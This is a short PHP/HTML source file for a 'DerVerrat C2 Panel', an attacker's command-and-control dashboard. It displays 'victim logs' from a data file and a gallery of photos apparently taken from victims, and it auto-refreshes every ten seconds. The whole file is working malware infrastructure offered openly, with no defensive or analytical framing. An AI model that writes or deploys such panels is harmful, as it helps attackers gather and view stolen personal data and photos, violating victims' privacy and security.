<!DOCTYPE html>
<html>
<head>
    <title>🎯 DerVerrat C2 Panel</title>
    <style>body{font-family:monospace;background:#000;color:#0f0;padding:20px;overflow:auto;}pre{font-size:12px;}</style>
</head>
<body>
<h1>🎯 CONTROL PANEL - <span style="color:#ff0"><?php echo $_SERVER['REMOTE_ADDR'];?></span></h1>
<hr>
<h2>📊 VICTIM LOGS (<?=count(file('data/logs.txt'))?> entries)</h2>
<pre style="background:#111;padding:15px;border-radius:5px;height:400px;overflow:auto;"><?php
if(file_exists('data/logs.txt')){
    echo htmlspecialchars(file_get_contents('data/logs.txt'));
} else echo "No victims yet...";
?></pre>

<h2>📸 PHOTOS (<?=count(glob('data/photos/*.{jpg,jpeg,png,gif}', GLOB_BRACE))?>)</h2>
<div style="display:flex;flex-wrap:wrap;gap:10px;">
<?php
$photos=glob('data/photos/*');
foreach($photos as $photo){
    $size=filesize($photo);
    echo '<div style="border:1px solid #0f0;padding:10px;text-align:center;">';
    echo '<a href="'.$photo.'" target="_blank"><img src="'.$photo.'" width="200" style="border-radius:5px;"></a><br>';
    echo basename($photo).' ('.number_format($size/1024,1).'KB)';
    echo '</div>';
}
?>
</div>

<h2>🔄 REFRESH EVERY 10s</h2>
<script>setTimeout(()=>location.reload(),10000);</script>
</body>
</html>
